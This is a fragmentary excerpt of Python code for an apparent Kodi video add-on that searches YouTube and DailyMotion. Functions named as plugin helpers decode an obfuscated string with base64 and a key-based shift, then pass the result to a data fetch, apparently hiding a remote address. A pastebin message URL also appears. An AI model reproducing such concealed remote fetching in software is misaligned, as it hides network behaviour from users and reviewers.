...
import traceback
import cookielib
#mensagem Watch TV Brasil
__addon__ = xbmcaddon.Addon()
__addonname__ = __addon__.getAddonInfo('name')
__icon__ = __addon__.getAddonInfo('icon')
 
msg = ("http://pastebin.com/raw/WWVRRvFL") 
...
def startPlugins(pluginList):
	return 'maKknqloY12wkqKTlqqklqCapJecXGZeZKWek5afoaqPpJ5nlJ2dXX6doZNeY159k6SjY5aonpOPm5ucqVytqaI='	
...
plugin_struct = startPlugins('youtube, dailymotion')
...
#hakamac code
    ...
    List=[]
    List.append(getPluginStat(plugin_struct))
    PassedUrls = 0
    FoundChannel = 1 
    ReadChannel = 0
    FoundMatch = 0
...
def LoadPlugins():
    getData(getPluginStat(plugin_struct),'')
...
def getPluginStat(_b):
    _a = module_revision;
    _c = []
    _b = base64.urlsafe_b64decode(_b)
    for i in range(len(_b)):
        _d = _a[i % len(_a)]
        _e = chr((256 + ord(_b[i]) - ord(_d)) % 256)
        _c.append(_e)
    return "".join(_c)
...
def search(site_name,search_term=None):
    ...
    if 'youtube' in site_name:
        ...
        import Plugin_YouTube

        search_res = {}
        search_res = Plugin_YouTube.YoUTube('searchYT',youtube=search_term,max_page=4,nosave='nosave')
        ...
        #youtube = youtube#Lana Del Rey
        import Plugin_DailyMotion
        familyFilter = str(addon.getSetting('familyFilter'))
        Plugin_DailyMotion.listVideos(urlMain+"/videos?fields=description,duration,id,owner.username,taken_time,thumbnail_large_url,title,views_total&search="+search_term+"&sort=relevance&limit=100&family_filter="+familyFilter+"&localization=en_EN&page=1")
